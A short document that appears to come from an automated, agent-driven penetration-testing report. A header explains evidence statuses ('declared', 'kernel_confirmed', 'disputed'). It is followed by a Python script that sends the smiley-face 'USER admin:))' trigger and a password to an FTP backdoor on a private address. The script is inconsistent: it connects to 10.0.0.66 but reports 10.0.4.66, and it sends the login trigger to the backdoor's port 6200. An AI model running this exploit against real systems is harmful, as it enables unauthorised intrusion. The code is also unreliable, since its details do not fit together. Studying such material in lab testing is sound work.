## ⚠️ Evidence Model

Events in this report are tagged with an **evidence status**:

- **declared** — Self-reported by the agent stack (command run → keyword/LLM ATT&CK lookup). NOT independently verified against kernel-level activity.
- **kernel_confirmed** — Verified against real kernel events (execve, connect, openat...) captured via eBPF (Tetragon/Falco) in the target container.
- **disputed** — A kernel event was found in the expected time window but does not match what was declared.

import socket
import select

# Create a socket connection to the backdoor
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)

try:
    # Connect to the backdoor
    sock.connect(('10.0.0.66', 6200))
    print("[+] Connected to 10.0.4.66:6200")
    
    # Send the exploit payload - username with :)
    payload = b"USER admin:))\r\n"
    sock.send(payload)
    print("[+] Sent: USER admin:))")
    
    # Read response
    response = b""
    sock.settimeout(5)
    try:
        while True:
            ready, _, _ = select.select([sock], [], [], 5)
            if ready:
                data = sock.recv(1024)
                if data:
                    response += data
    except:
        pass
    
    print("[+] Response:")
    print(response.decode('utf-8', errors='ignore'))
    
    # Now send password
    payload2 = b"PASS admin\r\n"
    sock.send(payload2)
    print("[+] Sent: PASS admin")
    
    # Read response
    response2 = b""
    sock.settimeout(5)
    try:
        while True:
            ready, _, _ = select.select([sock], [], [], 5)
            if ready:
                data = sock.recv(1024)
                if data:
                    response2 += data
    except:
        pass
    
    print("[+] After password:")
    print(response2.decode('utf-8', errors='ignore'))
    
    # Send QUIT
    payload3 = b"QUIT\r\n"
    sock.send(payload3)
    
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    sock.close()
